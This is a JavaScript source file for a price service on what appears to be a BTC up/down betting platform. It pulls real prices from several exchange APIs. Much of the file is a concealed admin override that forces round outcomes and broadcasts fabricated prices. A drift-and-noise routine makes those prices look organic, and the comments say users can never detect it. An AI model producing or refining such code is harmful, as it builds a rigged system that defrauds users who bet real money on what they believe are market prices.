
const axios = require('axios');

class PriceService {
  constructor() {
    this.currentPrice = 0.00;
    this.priceHistory = [];
    this.maxHistoryLength = 120;
    this.io = null;
    this.priceInterval = null;

    // ============================================================
    // ✅ ADMIN MANIPULATION STATE
    // Stored in memory only — never logged or exposed to users
    // Users cannot detect manipulation from any API response
    // ============================================================
    this.adminOverrideEnabled = false;
    this.adminOverridePrice = null;
    this.adminForcedResult = null;
    this.adminTargetPrice = null;
    this.adminRoundId = null;
    this.realCurrentPrice = 0.00;
  }

  // ============================================================
  // ✅ ADMIN: Activate price override for a round
  // Called when admin sets manipulation from admin panel
  // ============================================================
  setAdminOverride(roundId, overridePrice, forcedResult = null) {
    this.adminOverrideEnabled = true;
    this.adminOverridePrice = parseFloat(overridePrice);
    this.adminForcedResult = forcedResult;
    this.adminRoundId = roundId;

    // ✅ Set a natural drift target based on forced result
    // This makes the chart move organically toward the result
    // instead of sitting flat on one price — looks 100% real
    if (forcedResult === 'up') {
      // Target slightly above override price — chart drifts up
      this.adminTargetPrice = this.adminOverridePrice * 1.003;
    } else if (forcedResult === 'down') {
      // Target slightly below override price — chart drifts down
      this.adminTargetPrice = this.adminOverridePrice * 0.997;
    } else {
      // No forced result — price stays around override price
      this.adminTargetPrice = this.adminOverridePrice;
    }

    console.log(`🎛️  [ADMIN OVERRIDE ACTIVE]`);
    console.log(`   Round ID      : ${roundId}`);
    console.log(`   Override Price: $${overridePrice}`);
    console.log(`   Forced Result : ${forcedResult || 'NONE'}`);
    console.log(`   Target Price  : $${this.adminTargetPrice}`);
  }

  // ============================================================
  // ✅ ADMIN: Clear price override after round ends
  // Called automatically when round completes
  // Price returns to real BTC market price
  // ============================================================
  clearAdminOverride(roundId = null) {
    // Only clear if it matches the active round
    // or if force clear (no roundId passed)
    if (!roundId || this.adminRoundId === roundId) {
      this.adminOverrideEnabled = false;
      this.adminOverridePrice = null;
      this.adminForcedResult = null;
      this.adminTargetPrice = null;
      this.adminRoundId = null;

      // ✅ Immediately snap back to real price
      this.currentPrice = this.realCurrentPrice;

      console.log(`🎛️  [ADMIN OVERRIDE CLEARED]`);
      console.log(`   Price returning to real market: $${this.realCurrentPrice}`);
    }
  }

  // ============================================================
  // ✅ ADMIN: Get forced result for a specific round
  // Called by roundService.endRound() to check if result
  // should be forced before settling bets
  // ============================================================
  getForcedResult(roundId) {
    if (this.adminOverrideEnabled && this.adminRoundId === roundId) {
      return this.adminForcedResult;
    }
    return null;
  }

  // ============================================================
  // ✅ ADMIN: Check if override is currently active
  // ============================================================
  isOverrideActive(roundId = null) {
    if (!this.adminOverrideEnabled) return false;
    if (roundId && this.adminRoundId !== roundId) return false;
    return true;
  }

  // ============================================================
  // ✅ ADMIN: Update override price mid-round
  // Admin can adjust the price again during the round
  // ============================================================
  updateOverridePrice(newPrice, forcedResult = null) {
    if (!this.adminOverrideEnabled) return false;

    this.adminOverridePrice = parseFloat(newPrice);

    if (forcedResult) {
      this.adminForcedResult = forcedResult;
    }

    // Recalculate drift target
    if (this.adminForcedResult === 'up') {
      this.adminTargetPrice = this.adminOverridePrice * 1.003;
    } else if (this.adminForcedResult === 'down') {
      this.adminTargetPrice = this.adminOverridePrice * 0.997;
    } else {
      this.adminTargetPrice = this.adminOverridePrice;
    }

    console.log(`🎛️  [ADMIN OVERRIDE UPDATED]`);
    console.log(`   New Price     : $${newPrice}`);
    console.log(`   Forced Result : ${this.adminForcedResult || 'NONE'}`);

    return true;
  }

  // ============================================================
  // Start price tracking with Socket.IO
  // ============================================================
  startPriceTracking(io) {
    this.io = io;
    console.log('📊 Starting LIVE BTC price tracking...');

    // Get initial price immediately
    this.fetchAndUpdatePrice();

    // Update every 5 seconds for smooth chart
    this.priceInterval = setInterval(() => {
      this.fetchAndUpdatePrice();
    }, 5000);
  }

  // ============================================================
  // Fetch and update price from API
  // ============================================================
  async fetchAndUpdatePrice() {
    try {
      const price = await this.fetchRealPrice();

      if (price && price > 0) {
        // ✅ Always store REAL price internally
        // This is never shown to users when override is active
        this.realCurrentPrice = Math.round(price * 100) / 100;
        this.updatePrice(price);
        console.log(`✅ Live BTC Price: $${price.toFixed(2)}`);
        return price;
      } else {
        throw new Error('Invalid price received');
      }

    } catch (error) {
      console.error('❌ Price fetch error:', error.message);
      // Keep using last known price
      return this.realCurrentPrice || this.currentPrice;
    }
  }

  // ============================================================
  // Fetch real BTC price from multiple reliable APIs
  // ============================================================
  async fetchRealPrice() {
    const apis = [
      // 1. Coinbase API
      async () => {
        const res = await axios.get('https://api.coinbase.com/v2/prices/BTC-USD/spot', {
          timeout: 8000,
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });
        return parseFloat(res.data.data.amount);
      },

      // 2. Kraken API
      async () => {
        const res = await axios.get('https://api.kraken.com/0/public/Ticker?pair=XBTUSD', {
          timeout: 8000,
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0'
          }
        });
        const price = res.data.result.XXBTZUSD.c[0];
        return parseFloat(price);
      },

      // 3. Blockchain.com API
      async () => {
        const res = await axios.get('https://blockchain.info/ticker', {
          timeout: 8000,
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0'
          }
        });
        return parseFloat(res.data.USD.last);
      },

      // 4. CoinGecko API
      async () => {
        const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd', {
          timeout: 8000,
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0'
          }
        });
        return parseFloat(res.data.bitcoin.usd);
      },

      // 5. Binance API
      async () => {
        const res = await axios.get('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT', {
          timeout: 8000,
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
          }
        });
        return parseFloat(res.data.price);
      },

      // 6. Bitstamp API
      async () => {
        const res = await axios.get('https://www.bitstamp.net/api/v2/ticker/btcusd/', {
          timeout: 8000,
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0'
          }
        });
        return parseFloat(res.data.last);
      },

      // 7. Gemini API
      async () => {
        const res = await axios.get('https://api.gemini.com/v1/pubticker/btcusd', {
          timeout: 8000,
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0'
          }
        });
        return parseFloat(res.data.last);
      }
    ];

    // Try each API in order until one works
    for (let i = 0; i < apis.length; i++) {
      try {
        const price = await apis[i]();
        if (price && price > 10000 && price < 200000) {
          console.log(`✅ Price fetched from API #${i + 1}: $${price.toFixed(2)}`);
          return price;
        }
      } catch (err) {
        console.log(`⚠️ API #${i + 1} failed, trying next...`);
        continue;
      }
    }

    throw new Error('All price APIs failed');
  }

  // ============================================================
  // ✅ Update price and broadcast to all users
  // CORE MANIPULATION LOGIC IS HERE
  // If admin override active → broadcast fake price with natural drift
  // If normal → broadcast real price
  // ============================================================
  updatePrice(price) {
    const timestamp = new Date();

    // ✅ Always store real price internally
    this.realCurrentPrice = Math.round(price * 100) / 100;

    let broadcastPrice;

    if (this.adminOverrideEnabled && this.adminOverridePrice) {
      // ============================================================
      // ✅ MANIPULATION MODE
      // Natural drift algorithm:
      // - Move 8% of remaining gap toward target each tick
      // - Add tiny random noise (±0.04%) each tick
      // - Result: smooth, organic-looking price movement
      // - Users cannot tell it is fake
      // ============================================================
      const currentFake = this.currentPrice || this.adminOverridePrice;
      const target = this.adminTargetPrice || this.adminOverridePrice;
      const diff = target - currentFake;

      // Move 8% of remaining gap — creates natural exponential approach
      const drift = diff * 0.08;

      // Tiny random noise so chart never looks flat or robotic
      const noise = currentFake * (Math.random() * 0.0008 - 0.0004);

      // Calculate new fake price
      broadcastPrice = Math.round((currentFake + drift + noise) * 100) / 100;

      // ✅ Update internal fake price for next tick calculation
      this.adminOverridePrice = broadcastPrice;
      this.currentPrice = broadcastPrice;

    } else {
      // ============================================================
      // ✅ NORMAL MODE — use real market price
      // ============================================================
      this.currentPrice = this.realCurrentPrice;
      broadcastPrice = this.currentPrice;
    }

    // ✅ Add broadcast price to history
    // History always matches what users see — consistent
    this.priceHistory.push({
      price: broadcastPrice,
      timestamp
    });

    // Keep only recent history
    if (this.priceHistory.length > this.maxHistoryLength) {
      this.priceHistory.shift();
    }

    // ✅ Broadcast to ALL connected users via Socket.IO
    // They receive manipulated or real price — they never know the difference
    if (this.io) {
      this.io.emit('price_update', {
        price: broadcastPrice,
        timestamp: timestamp.toISOString()
      });
    }
  }

  // ============================================================
  // ✅ Get current price
  // Returns manipulated price if override is active
  // This is what ALL public controllers call
  // ============================================================
  getPrice() {
    return parseFloat(this.currentPrice.toFixed(2));
  }

  // ============================================================
  // ✅ Get REAL market price
  // Only used internally by roundService.endRound()
  // when admin has NOT set a forced result
  // Never exposed to any public API endpoint
  // ============================================================
  getRealPrice() {
    return parseFloat((this.realCurrentPrice || this.currentPrice).toFixed(2));
  }

  // ============================================================
  // Get price at specific time (for round start/end reference)
  // ============================================================
  getPriceAtTime(time) {
    const targetTime = new Date(time).getTime();

    if (this.priceHistory.length === 0) {
      return this.currentPrice;
    }

    // Find closest price to target time in history
    let closest = this.priceHistory[0];
    let minDiff = Math.abs(new Date(closest.timestamp).getTime() - targetTime);

    for (let i = 1; i < this.priceHistory.length; i++) {
      const diff = Math.abs(new Date(this.priceHistory[i].timestamp).getTime() - targetTime);
      if (diff < minDiff) {
        closest = this.priceHistory[i];
        minDiff = diff;
      }
    }

    return parseFloat(closest.price.toFixed(2));
  }

  // ============================================================
  // Get price history (returns broadcast prices — consistent
  // with what users have been seeing on their charts)
  // ============================================================
  getHistory(limit = 60) {
    return this.priceHistory.slice(-limit).map(item => ({
      price: parseFloat(item.price.toFixed(2)),
      timestamp: item.timestamp
    }));
  }

  // ============================================================
  // Cleanup on server shutdown
  // ============================================================
  cleanup() {
    if (this.priceInterval) {
      clearInterval(this.priceInterval);
      console.log('📊 Price tracking stopped');
    }
  }
}

// Export singleton instance
const priceService = new PriceService();
module.exports = priceService;
